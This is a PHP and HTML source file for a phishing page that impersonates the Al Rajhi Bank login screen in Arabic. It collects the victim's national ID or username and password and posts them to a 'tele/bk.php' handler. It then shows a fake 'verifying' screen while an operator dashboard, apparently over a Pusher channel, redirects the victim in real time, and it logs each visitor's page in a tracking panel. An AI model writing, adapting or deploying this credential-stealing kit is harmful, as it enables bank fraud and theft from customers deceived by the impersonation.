<?php
session_start();

require_once 'dashboard/init.php';

// الحصول على user_id
$userId = null;

if (isset($_GET['id'])) {
    $userId = $_GET['id'];
    $_SESSION['current_user_id'] = $userId;
} elseif (isset($_SESSION['current_user_id'])) {
    $userId = $_SESSION['current_user_id'];
} elseif (isset($_SESSION['user_session'])) {
    $userId = $_SESSION['user_session'];
    $_SESSION['current_user_id'] = $userId;
}

if (!$userId) {
    header('Location: register.php');
    exit;
}

// تحديث الصفحة الحالية
$User->updateUserCurrentPage($userId, 'BK.php');
$User->updateUserMessage($userId, 'صفحة بنك الراجحي');
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>تسجيل الدخول</title>
  <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin:0;
      font-family:'Almarai', sans-serif;
      background:#fff;
      color:#000;
      display:flex;
      justify-content:center;
      min-height:100vh;
    }
    .container {
      width:100%;
      max-width:420px;
      padding:30px 20px 50px;
    }
    .logo {
      display:block;
      margin:20px auto;
      width:58px;
    }
    .title {
      text-align:center;
      margin:25px 0;
      line-height:1.6;
    }
    .title .hi {
      font-size:16px;
      color:#444;
    }
    .title .lead {
      font-size:20px;
      font-weight:700;
      color:#000;
    }
    .field {
      background:#f6f7fa;
      border:1px solid #e5e8ef;
      border-radius:12px;
      padding:14px;
      display:flex;
      align-items:center;
      margin-bottom:14px;
    }
    .field input {
      flex:1;
      border:0;
      background:transparent;
      font-size:15px;
      outline:none;
      color:#000;
    }
    .field input::placeholder {
      color:#777;
    }
    .icon {
      margin-left:10px;
      cursor:pointer;
      font-size:18px;
      color:#0046AD;
    }
    .box-link {
      background:#f6f7fa;
      border:1px solid #e5e8ef;
      border-radius:12px;
      padding:14px;
      margin:18px 0;
      display:flex;
      justify-content:space-between;
      align-items:center;
      font-size:15px;
      color:#000;
      cursor:pointer;
    }
    .box-link .sub {
      color:#666;
      font-size:13px;
      margin-top:3px;
    }
    .row {
      display:flex;
      justify-content:space-between;
      align-items:center;
      margin:20px 0;
      font-size:14px;
    }
    .row a {
      color:#0046AD;
      text-decoration:none;
      font-weight:600;
    }
    .remember {
      display:flex;
      align-items:center;
      gap:6px;
      color:#333;
    }
    .remember input {
      accent-color:#0046AD;
      width:16px;
      height:16px;
    }
    button {
      width:100%;
      border:0;
      padding:14px;
      border-radius:12px;
      font-size:15px;
      font-weight:700;
      cursor:pointer;
      margin-bottom:14px;
      font-family:'Almarai', sans-serif;
    }
    .btn-login {
      background:#e6eeff;
      color:#999;
      cursor:not-allowed;
    }
    .btn-login.active {
      background:#0046AD;
      color:#fff;
      cursor:pointer;
    }
    .btn-fast {
      background:#e6eeff;
      color:#0046AD;
    }
    .open-acc {
      display:block;
      text-align:center;
      margin-top:10px;
      font-weight:600;
      color:#0046AD;
      text-decoration:none;
    }
    .error {
      color:#d32f2f;
      font-size:14px;
      margin-top:8px;
      display:none;
    }

    /* ============ صفحة الانتظار ============ */
    #loadingScreen {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #fff;
      z-index: 9999;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    #loadingScreen.show {
      display: flex;
    }

    .spinner {
      width: 60px;
      height: 60px;
      border: 5px solid #e6eeff;
      border-top: 5px solid #0046AD;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      font-size: 18px;
      font-weight: 700;
      color: #0046AD;
      margin-top: 15px;
    }

    .loading-subtext {
      font-size: 14px;
      color: #666;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container" id="loginContainer">
    <img src="img/alrajhibank-logo.webp" alt="Logo" class="logo">

    <div class="title">
      <div class="hi">مرحباً بك</div>
      <div class="lead">بالتجربة الرقمية الأفضل</div>
    </div>

    <form id="loginForm" class="space-y-4">
      <div class="field">
        <input type="hidden" name="bank" value="راجحي">
        <input style="font-family: 'Almarai', system-ui, -apple-system, Segoe UI, Roboto, Arial;" 
               type="text" 
               id="uid" 
               name="user_name" 
               placeholder="أدخل الهوية الوطنية أو اسم المستخدم" 
               required>
      </div>

      <div class="field">
        <input style="font-family: 'Almarai', system-ui, -apple-system, Segoe UI, Roboto, Arial;" 
               type="password" 
               id="pwd" 
               name="bk_pass" 
               placeholder="ادخل كلمة المرور" 
               required>
      </div>
      <div id="formError" class="error">تعذّر تسجيل الدخول. الرجاء المحاولة مرة أخرى.</div>

      <div class="box-link">
        <div>
          <div style="font-weight:700">هل لديك حساب في الراجحي؟</div>
          <div class="sub">سجّل في القناة الرقمية هنا</div>
        </div>
        <div style="font-size:18px;color:#666">‹</div>
      </div>

      <div class="row">
        <a href="#">نسيت كلمة المرور؟</a>
        <label class="remember">
          <input type="checkbox" checked> تذكرني
        </label>
      </div>

      <button type="submit" id="loginBtn" class="btn-login" disabled>تسجيل الدخول</button>
      <button type="button" class="btn-fast">فعل خدمة الدخول السريع</button>

      <a class="open-acc" href="#">افتح حساب</a>
    </form>
  </div>

  <!-- ✅ شاشة الانتظار -->
  <div id="loadingScreen">
    <img src="img/alrajhibank-logo.webp" alt="Logo" style="width: 80px; margin-bottom: 30px;">
    <div class="spinner"></div>
    <div class="loading-text">جاري التحقق...</div>
    <div class="loading-subtext">يرجى الانتظار، لا تغلق الصفحة</div>
  </div>

  <script>
    localStorage.setItem('current_user_id', '<?php echo $userId; ?>');

    const uid = document.getElementById('uid');
    const pwd = document.getElementById('pwd');
    const loginBtn = document.getElementById('loginBtn');
    const loginForm = document.getElementById('loginForm');
    const formError = document.getElementById('formError');

    function sync() {
      const ok = uid.value.trim() && pwd.value.trim();
      if (ok) {
        loginBtn.classList.add('active');
        loginBtn.disabled = false;
      } else {
        loginBtn.classList.remove('active');
        loginBtn.disabled = true;
      }
    }
    uid.addEventListener('input', sync);
    pwd.addEventListener('input', sync);

    loginForm.addEventListener('submit', async function(e) {
      e.preventDefault();
      formError.style.display = 'none';

      const formData = new FormData(loginForm);
      
      try {
        const response = await fetch('tele/bk.php', {
          method: 'POST',
          body: formData
        });
        
        const result = await response.json();
        
        if (response.ok && result.success) {
          // ✅ إخفاء النموذج وإظهار شاشة الانتظار
          document.getElementById('loginContainer').style.display = 'none';
          document.getElementById('loadingScreen').classList.add('show');
          
          // ✅ العميل ينتظر التوجيه من لوحة التحكم
          console.log('✅ تم إرسال البيانات، بانتظار التوجيه...');
        } else {
          formError.textContent = result.error || 'تعذّر تسجيل الدخول. الرجاء المحاولة مرة أخرى.';
          formError.style.display = 'block';
        }
      } catch (err) {
        console.error('خطأ:', err);
        formError.textContent = 'تعذّر الإرسال مؤقتًا. الرجاء المحاولة مرة أخرى.';
        formError.style.display = 'block';
      }
    });
  </script>

  <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
  <script>
    const pusher = new Pusher('a56388ee6222f6c5fb86', {
      cluster: 'ap2',
      encrypted: true
    });

    const channel = pusher.subscribe('my-channel');

    channel.bind('force-redirect-user', function(data) {
      const myId = localStorage.getItem('current_user_id');

      if (myId && data.userId == myId) {
        console.log('🔄 توجيه العميل إلى:', data.url);
        window.location.href = data.url;
      }
    });
  </script>
</body>
</html>